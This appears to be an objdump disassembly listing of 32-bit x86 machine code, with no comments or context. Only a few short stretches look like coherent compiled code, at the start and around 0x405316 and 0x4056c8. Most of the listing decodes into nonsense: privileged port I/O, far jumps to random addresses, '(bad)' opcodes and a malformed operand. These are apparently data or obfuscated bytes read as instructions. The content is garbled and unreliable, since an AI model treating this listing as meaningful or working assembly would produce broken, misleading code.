  404ee0:	shr    ecx,0x2
  404ee3:	mov    ecx,DWORD PTR [ebp-0x10]
  404ee6:	mov    edx,DWORD PTR [ebp-0xc]
  404ee9:	xor    eax,edi
  404eeb:	shl    ecx,0x1e
  404eee:	xor    edx,edx
  404ef0:	or     eax,edx
  404ef2:	lea    eax,[ebp+eax*1-0x4]
  404ef6:	mov    DWORD PTR [ebp-0x34],eax
  404ef9:	mov    eax,DWORD PTR [ebp-0x10]
  404efc:	mov    ecx,DWORD PTR [ebp-0xc]
  404eff:	shrd   eax,ecx,0x2
  404f03:	shr    ecx,0x2
  404f06:	mov    ecx,DWORD PTR [ebp-0x10]
  404f09:	mov    edx,DWORD PTR [ebp-0xc]
  404f0c:	xor    eax,edi
  404f0e:	shl    ecx,0x1e
  404f11:	mov    ecx,DWORD PTR [ebp-0x14]
  404f14:	xor    edx,edx
  404f16:	or     eax,edx
  404f18:	mov    cl,BYTE PTR [eax+ecx*1]
  404f1b:	mov    eax,DWORD PTR [ebp-0x34]
  404f1e:	add    BYTE PTR [eax],cl
  404f20:	mov    eax,DWORD PTR [ebp-0x60]
  404f23:	mov    ecx,DWORD PTR [ebp-0x5c]
  404f26:	shrd   eax,ecx,0x2
  404f2a:	shr    ecx,0x2
  404f2d:	mov    ecx,DWORD PTR [ebp-0x60]
  404f30:	mov    edx,DWORD PTR [ebp-0x5c]
  404f33:	xor    eax,edi
  404f35:	xor    edx,edx
  404f37:	or     eax,edx
  404f39:	lea    eax,[ebp+eax*1-0x4]
  404f3d:	mov    DWORD PTR [ebp-0x34],eax
  404f40:	mov    eax,DWORD PTR [ebp-0x60]
  404f43:	shl    ecx,0x1e
  404f46:	mov    ecx,DWORD PTR [ebp-0x5c]
  404f49:	shrd   eax,ecx,0x2
  404f4d:	shr    ecx,0x2
  404f50:	mov    ecx,DWORD PTR [ebp-0x60]
  404f53:	mov    edx,DWORD PTR [ebp-0x5c]
  404f56:	xor    eax,edi
  404f58:	xor    edx,edx
  404f5a:	or     eax,edx
  404f5c:	mov    edx,DWORD PTR [ebp+0x14]
  404f5f:	shl    ecx,0x1e
  404f62:	mov    ecx,DWORD PTR [ebp-0x14]
  404f65:	mov    cl,BYTE PTR [eax+ecx*1]
  404f68:	mov    eax,DWORD PTR [ebp-0x34]
  404f6b:	or     BYTE PTR [eax],cl
  404f6d:	jmp    0x40530e
  404f72:	mov    DWORD PTR [edx],ecx
  404f74:	push   0xabac68c5
  404f79:	mov    al,BYTE PTR [edi+0x28920a40]
  404f7f:	add    eax,0x11becfc3
  404f84:	mov    esi,0xbec4bdbe
  404f89:	mov    esi,0xc3d2d8ad
  404f8e:	lods   al,BYTE PTR ds:[esi]
  404f8f:	dec    ebp
  404f90:	pop    edi
  404f91:	jmp    0xab844434
  404f96:	in     al,0xb
  404f98:	lds    eax,FWORD PTR [eax+0x2e0ca8ba]
  404f9e:	stos   DWORD PTR es:[edi],eax
  404f9f:	and    BYTE PTR [edx],ch
  404fa1:	jnp    0x404f5b
  404fa3:	popf   
  404fa4:	repz push edx
  404fa6:	adc    ebp,DWORD PTR [edi-0x1c44fbee]
  404fac:	sbb    al,0x22
  404fae:	xor    DWORD PTR ds:[ecx-0x5ef0aa58],0xc8bae0f5
  404fb9:	arpl   WORD PTR [ecx+edi*2-0x21ce1b8f],bx
  404fc0:	shl    esi,0x25
  404fc3:	icebp  
  404fc4:	cmp    esp,DWORD PTR [edx+0x68]
  404fc7:	sbb    DWORD PTR [esi+eax*1+0x63cdb16b],esp
  404fce:	push   esi
  404fcf:	cmp    DWORD PTR [edi-0x4c1a2a11],0xffffffca
  404fd6:	imul   ecx,DWORD PTR [esi-0x6c592f4d],0x4071c41e
  404fe0:	jl     0x404fb2
  404fe2:	xor    ah,0x28
  404fe5:	xchg   edx,eax
  404fe6:	sub    dl,BYTE PTR [eax+0x20]
  404fe9:	sar    DWORD PTR [eax+0x17],cl
  404fec:	mov    bh,0xdb
  404fee:	xchg   ebx,eax
  404fef:	(bad)  
  404ff0:	mov    ebp,0x8e15474f
  404ff5:	inc    ebp
  404ff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ff8:	xlat   BYTE PTR ds:[ebx]
  404ff9:	loop   0x404fc6
  404ffb:	std    
  404ffc:	mov    DWORD PTR [edi+0x2b],0xaf36638a
  405003:	(bad)  
  405004:	mov    esp,0x69c71b2e
  405009:	mov    ds:0x453b8d17,eax
  40500e:	test   eax,0xb6466443
  405013:	cdq    
  405014:	popa   
  405015:	and    eax,ecx
  405017:	pop    es
  405018:	(bad)  
  40501a:	pushf  
  40501b:	or     al,0x96
  40501d:	scas   al,BYTE PTR es:[edi]
  40501e:	mov    ebx,0x8fb49cf3
  405023:	aam    0x48
  405025:	cli    
  405026:	aad    0x40
  405028:	mov    cl,al
  40502a:	sbb    BYTE PTR [ebx+eax*4+0x4a],dl
  40502e:	xor    DWORD PTR [ebx-0x48d5a31e],0xe70cee0b
  405038:	imul   ecx,DWORD PTR [esi-0x47],0x7d18116d
  40503f:	inc    ebx
  405040:	sar    BYTE PTR [ebx],1
  405042:	mov    bh,0xa3
  405044:	das    
  405045:	mov    al,0x46
  405048:	pop    esi
  405049:	ins    BYTE PTR es:[edi],dx
  40504a:	bound  edi,QWORD PTR [ecx-0x26]
  40504d:	pause  
  40504f:	push   ebx
  405050:	mov    dl,0x68
  405052:	lock or esp,edi
  405055:	fmul   QWORD PTR [edx]
  405057:	and    eax,DWORD PTR [ebx+0x57]
  40505a:	push   ss
  40505b:	out    0x80,eax
  40505d:	mov    dh,0x62
  40505f:	mov    edi,0xe16dda61
  405064:	imul   edi,DWORD PTR [edx-0x7dd9b2de],0x9e50fce8
  40506e:	cmc    
  40506f:	sbb    DWORD PTR [edx+0x272a07cd],ecx
  405075:	sub    BYTE PTR [esi+0x73],dl
  405078:	push   esp
  405079:	cmp    BYTE PTR [edx+esi*8+0x3338a2c6],bl
  405080:	outs   dx,DWORD PTR ds:[esi]
  405081:	xchg   edx,eax
  405082:	dec    eax
  405083:	dec    esi
  405084:	push   es
  405085:	(bad)  
  405089:	mul    DWORD PTR [edi-0x1eafee51]
  40508f:	sbb    DWORD PTR [eax-0x61],0xecfe4b71
  405096:	mov    DWORD PTR [edx+edx*1-0x7c],ebx
  40509a:	dec    eax
  40509b:	dec    ebp
  40509c:	dec    ebp
  40509d:	push   ss
  40509e:	cmp    ebp,ebx
  4050a0:	popa   
  4050a1:	pop    eax
  4050a2:	ret    
  4050a3:	lea    ebx,[edi]
  4050a5:	out    0x74,al
  4050a7:	ds jmp 0xbde0:0xe77a65bb
  4050af:	mov    ebp,0x16387c66
  4050b4:	lea    edi,[ecx-0x170e83e5]
  4050ba:	cmp    al,0x18
  4050bc:	retf   0x5a40
  4050bf:	xchg   ebp,eax
  4050c0:	jecxz  0x405115
  4050c2:	pop    esp
  4050c3:	xor    ch,BYTE PTR [ebx-0x7c]
  4050c6:	inc    ecx
  4050c7:	or     al,0xfb
  4050c9:	das    
  4050ca:	ret    0x7a5f
  4050cd:	test   esp,0xac638ba7
  4050d3:	js     0x405092
  4050d5:	and    al,0xd2
  4050d7:	xchg   DWORD PTR [ebx-0x41],ebp
  4050da:	cmp    BYTE PTR [edx+0x19c121c9],0x92
  4050e1:	and    BYTE PTR ds:0x90e8f938,ah
  4050e7:	and    al,BYTE PTR [ebx+ebp*4]
  4050ea:	adc    al,0xc3
  4050ec:	hlt    
  4050ed:	aas    
  4050ee:	adc    al,dh
  4050f0:	lods   al,BYTE PTR ds:[esi]
  4050f1:	out    dx,eax
  4050f2:	mov    ss,WORD PTR [edi]
  4050f4:	jle    0x405118
  4050f6:	(bad)  
  4050f7:	push   edx
  4050f8:	dec    edi
  4050f9:	in     eax,0x5
  4050fb:	push   0xffffff90
  4050fd:	int3   
  4050fe:	and    cl,BYTE PTR ds:0x99695399
  405104:	std    
  405105:	in     eax,dx
  405106:	sub    eax,0x46f518b7
  40510b:	mov    ch,0x77
  40510d:	out    0xac,eax
  40510f:	push   edi
  405110:	adc    dh,BYTE PTR [ebx]
  405112:	or     BYTE PTR [edx-0x59],bl
  405115:	je     0x40515f
  405117:	fs sahf 
  405119:	and    ebx,esp
  40511b:	mov    ds:0x8559236f,eax
  405120:	int3   
  405121:	xor    ecx,0x5
  405124:	(bad)  [esi+eiz*1]
  405127:	lea    ebx,[edx+0x43]
  40512a:	and    al,0xdf
  40512c:	or     eax,0x4f0570be
  405131:	aam    0xe
  405133:	push   ebx
  405134:	add    edx,DWORD PTR [edi+eiz*2-0x9]
  405138:	fistp  WORD PTR [esi+0x5f46cb40]
  40513e:	call   0xe805:0xd55e1dd9
  405145:	adc    DWORD PTR [eax-0x5eb0b5ee],ecx
  40514b:	sub    BYTE PTR [edx-0x64],bl
  40514e:	call   0x133da9b1
  405153:	xor    DWORD PTR [eax-0x44],ecx
  405156:	pop    ebp
  405157:	sub    bh,BYTE PTR [eax-0x3085fc1f]
  40515d:	faddp  st(5),st
  40515f:	(bad)  
  405160:	shr    DWORD PTR [ebp+0x1b],0x8f
  405164:	push   cs
  405165:	call   DWORD PTR [edi-0x363f6150]
  40516b:	test   al,0xb4
  40516d:	call   0x608e451f
  405172:	out    dx,al
  405173:	rcl    BYTE PTR [eax],cl
  405175:	int    0x99
  405177:	(bad)
  40517b:	pop    edx
  40517c:	inc    ebp
  40517d:	sbb    eax,esp
  40517f:	push   eax
  405180:	mov    ebx,0x1d45e751
  405185:	inc    eax
  405186:	sub    BYTE PTR [edx],al
  405188:	adc    BYTE PTR [edi+0x33],cl
  40518b:	push   0xfd1379da
  405190:	cwde   
  405191:	push   esi
  405192:	cmp    al,ah
  405194:	stc    
  405195:	jno    0x405122
  405197:	dec    edx
  405198:	icebp  
  405199:	adc    DWORD PTR [edi-0x61],0x40
  40519d:	xchg   ebx,eax
  40519e:	push   ss
  40519f:	popf   
  4051a0:	inc    edi
  4051a1:	cmp    BYTE PTR [edi],ch
  4051a3:	jg     0x40513b
  4051a5:	enter  0x7cd,0x26
  4051a9:	sbb    dl,BYTE PTR [edi+0x657fefd]
  4051af:	pop    ebx
  4051b0:	or     ebx,DWORD PTR [edx]
  4051b2:	mov    ebx,0x322ae307
  4051b7:	pop    es
  4051b8:	pop    esi
  4051b9:	int3   
  4051ba:	jns    0x405204
  4051bc:	xor    DWORD PTR [edi],edi
  4051be:	push   ebx
  4051bf:	mov    ds:0x16e4669d,eax
  4051c4:	push   ebx
  4051c5:	ja     0x40522b
  4051c7:	(bad)  
  4051c8:	push   ds
  4051c9:	and    DWORD PTR [ebp+0x734ef75b],esi
  4051cf:	std    
  4051d0:	int3   
  4051d1:	stc    
  4051d2:	js     0x4051af
  4051d4:	adc    BYTE PTR [ebp-0x2e],dl
  4051d7:	pop    esp
  4051d8:	clc    
  4051d9:	pop    esi
  4051da:	and    bh,bh
  4051dc:	mov    ebx,0x7cecd064
  4051e1:	push   edx
  4051e2:	nop
  4051e3:	in     al,dx
  4051e4:	test   ebx,edx
  4051e6:	neg    DWORD PTR [esi-0x2b]
  4051e9:	idiv   DWORD PTR [ebx+0x235bb348]
  4051ef:	jbe    0x4051af
  4051f1:	adc    al,0x2e
  4051f3:	aaa    
  4051f4:	(bad)  
  4051f5:	pop    edx
  4051f6:	in     eax,0xa
  4051f8:	dec    eax
  4051f9:	aaa    
  4051fa:	mov    esi,?
  4051fc:	xchg   ebp,eax
  4051fd:	adc    DWORD PTR [ebp-0x1c55773a],ebp
  405203:	xchg   ebx,eax
  405204:	imul   esp,esp,0xffffffba
  405207:	push   edx
  405208:	sub    eax,0x45230f
  40520d:	sbb    al,BYTE PTR [ebx+0x63]
  405210:	add    dh,ah
  405212:	lds    eax,FWORD PTR [eax]
  405214:	enter  0xf4da,0x10
  405218:	add    ebx,DWORD PTR [edx-0x4414fb4e]
  40521e:	add    esi,DWORD PTR [esi-0x242548c5]
  405224:	push   ebx
  405225:	xor    bl,BYTE PTR ds:0x474473ff
  40522b:	imul   ebx,DWORD PTR ss:[esp+eiz*8+0x4b5011ab],0xffffffd7
  405234:	jmp    0x8768:0x92abb3ee
  40523b:	test   eax,0x7ea2fc26
  405240:	retf   0x4da
  405243:	push   eax
  405244:	dec    ebx
  405245:	mov    esi,DWORD PTR [ebp-0x75]
  405248:	jmp    0xfcb6ca42
  40524d:	cmc    
  40524e:	ins    DWORD PTR es:[edi],dx
  40524f:	stos   BYTE PTR es:[edi],al
  405250:	push   edx
  405251:	pop    edx
  405252:	jb     0x405230
  405254:	add    BYTE PTR [edx],0xb9
  405257:	aaa    
  405258:	mov    al,0x20
  40525a:	mov    dl,0x94
  40525c:	adc    eax,0x52a978a6
  405261:	or     BYTE PTR ds:0x17181f81,bh
  405267:	and    DWORD PTR [edi+0xb],edi
  40526a:	push   0x14
  40526c:	mov    edi,0x2fdbfb2
  405271:	and    ah,BYTE PTR [edi]
  405273:	inc    esi
  405274:	fwait
  405275:	sbb    eax,0x70305191
  40527b:	cs or  eax,0xb3c000fc
  405281:	xchg   DWORD PTR [ecx+0x6f],ebp
  405284:	aaa    
  405285:	fisubr DWORD PTR [eax-0x3f]
  405288:	or     al,0x6
  40528a:	mov    eax,0xa4019b9a
  40528f:	lea    edx,[ebp+0x4d48c7a0]
  405295:	hlt    
  405296:	inc    eax
  405297:	jecxz  0x405257
  405299:	push   0x22
  40529b:	je     0x405246
  40529d:	xor    bh,al
  40529f:	jne    0x405276
  4052a1:	jo     0x405257
  4052a3:	jae    0x4052ca
  4052a5:	stos   BYTE PTR es:[edi],al
  4052a6:	xchg   ah,dh
  4052a8:	shl    DWORD PTR [ebx-0x5e],1
  4052ab:	push   0xbcc19615
  4052b0:	pop    edi
  4052b1:	clc    
  4052b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052b3:	mov    cl,0xfc
  4052b5:	div    bh
  4052b7:	mov    bh,0x0
  4052b9:	jp     0x4052f8
  4052bb:	rcr    al,1
  4052bd:	fisub  WORD PTR [ebp-0x8]
  4052c0:	or     cl,BYTE PTR [eax-0x151a23bb]
  4052c6:	loopne 0x40528e
  4052c8:	xchg   ebp,eax
  4052c9:	jl     0x40529b
  4052cb:	inc    eax
  4052cc:	fidivr WORD PTR [eax]
  4052ce:	mov    dh,0xf8
  4052d0:	dec    esp
  4052d1:	dec    esi
  4052d2:	mov    al,0x14
  4052d4:	inc    esi
  4052d5:	repnz xchg edx,eax
  4052d7:	jp     0x4052c0
  4052d9:	mov    es,ecx
  4052db:	push   0x44
  4052dd:	jne    0x405307
  4052df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052e0:	mov    DWORD PTR [edx],ebx
  4052e2:	adc    al,0x64
  4052e4:	adc    eax,0x6927ca67
  4052e9:	jecxz  0x405307
  4052eb:	push   cs
  4052ec:	test   DWORD PTR [esi+0x3ddab963],ebx
  4052f2:	mov    eax,0xee22b885
  4052f7:	jb     0x4052e0
  4052f9:	lds    ebx,FWORD PTR [edx+0x24]
  4052fc:	adc    ah,bl
  4052fe:	dec    ebp
  4052ff:	popf   
  405300:	jne    0x4052e4
  405302:	mov    al,ds:0x6f45d0d2
  405307:	in     al,dx
  405308:	mov    dh,0xb
  40530a:	int3   
  40530b:	pusha  
  40530c:	es sbb eax,0x8b10458b
  405312:	enter  0xac0f,0xd1
  405316:	add    al,cl
  405318:	loopne 0x405338
  40531a:	shr    edx,0x2
  40531d:	mov    DWORD PTR [ebp+0x14],edx
  405320:	mov    DWORD PTR [ebp+0x14],eax
  405323:	xor    edx,edx
  405325:	mov    eax,ecx
  405327:	jmp    0x4056c8
  40532c:	sub    eax,0x846700b2
  405331:	jnp    0x4052e9
  405333:	mov    esp,0xe3d964fe
  405338:	out    dx,al
  405339:	pusha  
  40533a:	jmp    0x40531f
  40533c:	mov    ebp,0xbdbebe17
  405341:	les    edi,FWORD PTR [esi+0x6f7056be]
  405347:	xchg   esp,eax
  405348:	or     dl,ch
  40534a:	jnp    0x4052fe
  40534c:	dec    edx
  40534d:	add    ch,dl
  40534f:	xor    DWORD PTR [edx-0x35943f7],esp
  405355:	cmp    dl,BYTE PTR [ebx-0x67]
  405358:	push   esi
  405359:	popa   
  40535a:	push   esi
  40535b:	lahf   
  40535c:	loopne 0x4053a7
  40535e:	ficom  WORD PTR [ebx+0x16]
  405361:	sub    ch,bl
  405363:	jl     0x40533b
  405365:	inc    esi
  405366:	or     ch,cl
  405368:	aad    0xb9
  40536a:	jnp    0x4053d7
  40536c:	pushf  
  40536d:	retf   
  40536e:	leave  
  40536f:	mov    eax,ds:0x37f0a477
  405374:	leave  
  405375:	push   eax
  405376:	jb     0x4053df
  405378:	mov    esi,DWORD PTR [ebx+0x17956236]
  40537e:	mov    ah,0xb5
  405380:	jle    0x40533e
  405382:	sar    BYTE PTR [esi+0x298463af],cl
  405388:	mov    cl,0xa1
  40538a:	fadd   DWORD PTR [edx]
  40538c:	cmp    al,0xc9
  40538e:	icebp  
  40538f:	push   0x4b9c1d76
  405394:	sbb    dl,BYTE PTR [edx]
  405396:	mov    eax,ds:0x443543f
  40539b:	pop    es
  40539c:	mov    ebx,0x6e80e44c
  4053a1:	popf   
  4053a2:	push   edi
  4053a3:	sub    al,0x2b
  4053a5:	jbe    0x40534b
  4053a7:	lds    ecx,FWORD PTR [edi+edi*2-0x74]
  4053ab:	dec    edi
  4053ac:	lahf   
  4053ad:	adc    ebx,ebp
  4053af:	shl    DWORD PTR [esi+edx*2+0x11f6798b],cl
  4053b6:	sub    dl,bh
  4053b8:	ret    
  4053b9:	xchg   edi,eax
  4053ba:	adc    dl,BYTE PTR ds:0xcf50767b
  4053c0:	inc    ebp
  4053c1:	out    dx,eax
  4053c2:	jecxz  0x405351
  4053c4:	xchg   ebx,eax
  4053c5:	out    0xdb,al
  4053c7:	mov    ecx,ebx
  4053c9:	outs   dx,BYTE PTR ds:[esi]
  4053ca:	mov    bh,0x42
  4053cc:	xchg   DWORD PTR [ebp-0x7afba966],ebp
  4053d2:	and    al,cl
  4053d4:	push   edx
  4053d5:	nop
  4053d6:	aas    
  4053d7:	sar    DWORD PTR [edx+0x27],cl
  4053da:	inc    edx
  4053db:	sbb    eax,0xfc01502c
  4053e0:	cmp    ah,BYTE PTR [esi+0x69]
  4053e3:	enter  0x67af,0xcf
  4053e7:	push   cs
  4053e8:	add    ebp,DWORD PTR [eax+0x72d9d291]
  4053ee:	cmp    al,0x4e
  4053f0:	pop    ss
  4053f1:	push   cs
  4053f2:	inc    edx
  4053f3:	sbb    bh,BYTE PTR [ecx+ebp*4+0x2e]
  4053f7:	push   ss
  4053f8:	popa   
  4053f9:	xor    edi,edi
  4053fb:	jmp    0xbd25e7d7
  405400:	xor    eax,0x46528db1
  405405:	call   0xe5d6:0xa67be40d
  40540c:	mov    WORD PTR [esi],ss
  40540e:	popa   
  40540f:	adc    al,0x80
  405411:	daa    
  405412:	enter  0x44ae,0x9a
  405416:	fisubr DWORD PTR [eiz*4+0x72a2c5b5]
  40541d:	popf   
  40541e:	cmc    
  40541f:	lea    eax,[eax]
  405421:	mov    BYTE PTR ds:0x3148ffcd,bl
  405427:	mov    esi,ebx
  405429:	sub    BYTE PTR [ecx],al
  40542b:	push   edx
  40542c:	call   FWORD PTR [ecx*2+0x2c321080]
  405433:	add    bh,BYTE PTR [ecx+0x71e87968]
  405439:	fadd   DWORD PTR [edi]
  40543b:	imul   ecx,ecx,0x1a
  40543e:	mov    bl,al
  405440:	push   edi
  405441:	ins    DWORD PTR es:[edi],dx
  405442:	stc    
  405443:	(bad)  
  405444:	push   edi
  405445:	les    esi,FWORD PTR [ebp+0x12]
  405448:	and    al,0xa0
  40544a:	in     al,dx
  40544b:	int    0x20
  40544d:	jle    0x405475
  40544f:	in     eax,dx
  405450:	adc    esi,DWORD PTR [ebp+0x63]
  405453:	mov    cl,0xac
  405455:	(bad)  
  405456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405457:	ret    0x451
  40545a:	cdq    
  40545b:	sbb    ecx,ebp
  40545d:	(bad)  
  40545e:	jmp    0xd3da2652
  405463:	xchg   esp,eax
  405464:	(bad)  
  405466:	mov    eax,esp
  405468:	test   DWORD PTR [ecx-0x30ed25a],ecx
  40546e:	pusha  
  40546f:	xor    cl,BYTE PTR [edi+edi*4-0x7b24379d]
  405476:	sbb    al,0x33
  405478:	bound  esp,QWORD PTR [ecx+esi*8+0x63]
  40547c:	jmpw   0x3521
  405480:	mov    ecx,0x175f41d7
  405485:	and    BYTE PTR ds:0x796a9a99,bl
  40548b:	lods   al,BYTE PTR ds:[esi]
  40548c:	clc    
  40548d:	ret    0x5b78
  405490:	int3   
  405491:	dec    esi
  405492:	div    DWORD PTR [eax-0x4f8919a8]
  405498:	mov    ebx,0xf6ed59ab
  40549d:	push   0x1646c8a1
  4054a2:	adc    eax,0x9e91a2a3
  4054a7:	pop    esi
  4054a8:	(bad)  
  4054aa:	fisub  WORD PTR [ebx+esi*4]
  4054ad:	pop    edx
  4054ae:	repz mov eax,0x468f1727
  4054b4:	xor    BYTE PTR [edx],ah
  4054b6:	repnz hlt 
  4054b8:	inc    ebp
  4054b9:	lahf   
  4054ba:	aad    0x5e
  4054bc:	inc    esp
  4054bd:	xchg   BYTE PTR [esi+0x3a3262fd],al
  4054c3:	push   esi
  4054c4:	scas   al,BYTE PTR es:[edi]
  4054c5:	jecxz  0x40551b
  4054c7:	dec    esi
  4054c8:	test   DWORD PTR [edi+edx*4-0x733ec4e6],ecx
  4054cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054d0:	mov    bh,0x98
  4054d2:	fist   WORD PTR [edi]
  4054d4:	add    eax,0x85e74a9c
  4054d9:	pushf  
  4054da:	xor    edx,DWORD PTR [ecx-0x24]
  4054dd:	cmp    al,0xae
  4054df:	daa    
  4054e0:	frstor gs:[ebp+0x62]
  4054e4:	push   esp
  4054e5:	cmp    eax,0xdb2b8f12
  4054ea:	cwde   
  4054eb:	je     0x4054e8
  4054ed:	sub    eax,edi
  4054ef:	(bad)  
  4054f0:	xor    al,0xb
  4054f2:	fbld   TBYTE PTR [edi]
  4054f4:	dec    esi
  4054f5:	int    0xad
  4054f7:	xchg   ebp,eax
  4054f8:	lea    eax,ds:0xacd587db
  4054fe:	mov    gs,WORD PTR [eax+0x17407354]
  405504:	imul   edx,ecx,0x76
  405507:	mov    cl,0xbe
  405509:	sub    BYTE PTR [edi+edx*4],cl
  40550c:	rol    ebx,cl
  40550e:	pop    ecx
  40550f:	jno    0x4054ef
  405511:	aaa    
  405512:	cmp    ch,BYTE PTR [ebp+0x6c]
  405515:	mov    bh,0x4
  405517:	xor    eax,0x5d93ea50
  40551c:	adc    DWORD PTR [esi+0x6],esp
  40551f:	mov    ds:0x3843cfcd,eax
  405524:	jle    0x4054b1
  405526:	add    bh,BYTE PTR [ebp+0x61]
  405529:	mov    BYTE PTR ds:0x6603824a,ch
  40552f:	cdq    
  405530:	sbb    al,0x6e
  405532:	mov    dh,0x33
  405534:	mov    dl,0x76
  405536:	lods   eax,DWORD PTR ds:[esi]
  405537:	test   al,0xfa
  405539:	mov    dl,0xf7
  40553b:	cld    
  40553c:	in     eax,dx
  40553d:	xor    esp,esp
  40553f:	scas   al,BYTE PTR es:[edi]
  405540:	pop    ds
  405541:	jmp    0x405547
  405543:	in     eax,0x31
  405545:	je     0x4054d6
  405547:	pop    ebp
  405548:	push   esp
  405549:	push   edx
  40554a:	(bad)  [esi+0x43]
  40554d:	pop    ebp
  40554e:	adc    DWORD PTR [ebx+0x3b],edi
  405551:	and    DWORD PTR [edi+edi*8+0x3139699e],eax
  405558:	jmp    0x72d9:0x1a04a8f0
  40555f:	xor    BYTE PTR [ebp+ecx*2-0x1b7da681],0x5d
  405567:	je     0x4054fa
  405569:	jb     0x4055cf
  40556b:	xlat   BYTE PTR ds:[ebx]
  40556c:	xchg   ecx,eax
  40556d:	mov    al,ds:0xd09840ce
  405572:	push   ebx
  405573:	xchg   edx,eax
  405574:	and    al,0x57
  405576:	adc    bl,BYTE PTR [ebx+ebx*1]
  405579:	(bad)  
  40557a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40557b:	pop    ebx
  40557c:	call   0x25c39cb8
  405581:	xor    BYTE PTR ds:0x608e3228,ah
  405587:	retf   0x4b0e
  40558a:	dec    eax
  40558b:	sar    BYTE PTR [eax],cl
  40558d:	fidiv  DWORD PTR [edi+0x1b04f439]
  405593:	neg    al
  405595:	add    bl,BYTE PTR [ecx]
  405597:	add    DWORD PTR [esp+eiz*4+0x26],0xa956a1cc
  40559f:	mov    ecx,0x5ad98ddb
  4055a4:	cmc    
  4055a5:	outs   dx,DWORD PTR ds:[esi]
  4055a6:	aam    0x62
  4055a8:	mov    ecx,0x437acfa5
  4055ad:	inc    edx
  4055ae:	setp   BYTE PTR cs:[di-0x4a]
  4055b4:	pop    edi
  4055b5:	inc    esi
  4055b6:	into   
  4055b7:	push   ss
  4055b8:	xor    DWORD PTR [ecx-0x17],0xb56a7a32
  4055bf:	pop    esi
  4055c0:	in     al,dx
  4055c1:	pop    ss
  4055c2:	out    dx,eax
  4055c3:	popa   
  4055c4:	push   ebp
  4055c5:	sahf   
  4055c6:	add    DWORD PTR [esp+edx*1-0x5a],edx
  4055ca:	ret    
  4055cb:	ins    DWORD PTR es:[edi],dx
  4055cc:	jle    0x405639
  4055ce:	xchg   ebx,eax
  4055cf:	mov    ch,0x5f
  4055d1:	les    edx,FWORD PTR [edi+0x73949804]
  4055d7:	sbb    eax,0x69e07d58
  4055dc:	idiv   BYTE PTR [esi-0x2e]
  4055df:	(bad)  
  4055e0:	bound  edi,QWORD PTR [esi]
  4055e2:	hlt    
  4055e3:	xor    BYTE PTR [ebp-0x33],dl
  4055e6:	mov    DWORD PTR [edx-0x3a8ddeb],0x5ac109b8
  4055f0:	in     al,0x76
  4055f2:	pop    ebx
  4055f3:	lock and DWORD PTR [edi+0x47],ebp
  4055f7:	or     ecx,DWORD PTR [ecx]
  4055f9:	fadd   QWORD PTR [esi]
  4055fb:	stos   BYTE PTR es:[edi],al
  4055fc:	pop    eax
  4055fd:	push   eax
  4055fe:	mov    bl,BYTE PTR [ebp-0x5624eeb4]
  405604:	add    BYTE PTR [esi+0x3e],dh
  405607:	cmp    eax,0x553ab885
  40560c:	add    DWORD PTR [ebx+eax*2+0x36],ecx
  405610:	hlt    
  405611:	and    eax,0x1b9aeafe
  405616:	cwd    
  405618:	ret    
  405619:	clc    
  40561a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40561b:	pop    ds
  40561c:	int    0xee
  40561e:	lahf   
  40561f:	int    0xdc
  405621:	mov    ecx,0x7009c19
  405626:	test   ah,dh
  405628:	xor    BYTE PTR [edx+edi*8],0x5d
  40562c:	mov    ah,0x87
  40562e:	push   esp
  40562f:	ret    0x2a02
  405632:	clc    
  405633:	nop
  405634:	xor    dl,BYTE PTR [edx-0x6fcdbd4d]
  40563a:	mov    bl,0xac
  40563c:	inc    edi
  40563d:	lock clc 
  40563f:	arpl   WORD PTR [edx-0x64b6b15a],bx
  405645:	sbb    edi,ecx
  405647:	mov    ebx,0xfd7cde89
  40564c:	or     bl,BYTE PTR [ecx-0x6b]
  40564f:	bound  esi,QWORD PTR [edi+0x50]
  405652:	retf   
  405653:	cmp    al,0xb1
  405655:	mov    ah,al
  405657:	test   eax,0xee05c88d
  40565c:	push   esp
  40565d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40565e:	cwde   
  40565f:	add    BYTE PTR [ecx-0x23],bl
  405662:	repnz mov esp,0x741587f4
  405668:	dec    edx
  405669:	aam    0x18
  40566b:	clc    
  40566c:	test   BYTE PTR [edx+0x2b],cl
  40566f:	and    eax,0x2f48d8f8
  405674:	call   0xf1fa:0x90d6c77
  40567b:	mov    edi,0xe99b9371
  405680:	inc    edx
  405681:	pop    eax
  405682:	pop    edx
  405683:	xchg   ebx,eax
  405684:	cmc    
  405685:	in     al,dx
  405686:	not    BYTE PTR [ebp-0x707e168e]
  40568c:	push   0xff3e10f7
  405691:	mov    dh,0x62
  405693:	dec    esi
  405694:	sub    cl,0x7a
  405697:	cmp    BYTE PTR [ebx+0x17742fbd],dh
  40569d:	pusha  
  40569e:	cdq    
  40569f:	call   0x6da543b1
  4056a4:	arpl   WORD PTR [esi+edi*4-0x42],di
  4056a8:	test   eax,0xeec4cf82
  4056ad:	mov    dl,dh
  4056af:	dec    ecx
  4056b0:	adc    bh,0x71
  4056b3:	(bad)
  4056b7:	push   0xc1df8708
  4056bc:	push   0x24
  4056be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056bf:	adc    eax,0xa41a2b3e
  4056c4:	cmp    BYTE PTR [ebp-0x72],0x44
  4056c8:	xor    eax,edi
  4056ca:	or     eax,edx
  4056cc:	mov    edx,DWORD PTR [ebp-0x4]
  4056cf:	dec    eax
  4056d0:	not    eax
  4056d2:	jmp    0x405a73
  4056d7:	int    0x14
  4056d9:	mov    ds:0x7ab8a317,eax
  4056de:	sbb    al,0x97
  4056e0:	mov    ah,0x18
  4056e2:	sar    DWORD PTR [ebp+0x77],1
  4056e5:	test   bh,cl
  4056e7:	mov    esi,0xbdbebe1f
  4056ec:	les    edi,FWORD PTR [esi-0x2c6dea42]
  4056f2:	shl    DWORD PTR [ecx+0x30f3d764],0x86
  4056f9:	cdq    
  4056fa:	mov    ebx,DWORD PTR [edi]
  4056fc:	in     eax,0xa4
  4056fe:	xor    eax,0x8e61bd30
  405703:	ds stos BYTE PTR es:[edi],al
  405705:	xchg   edi,eax
  405706:	out    dx,al
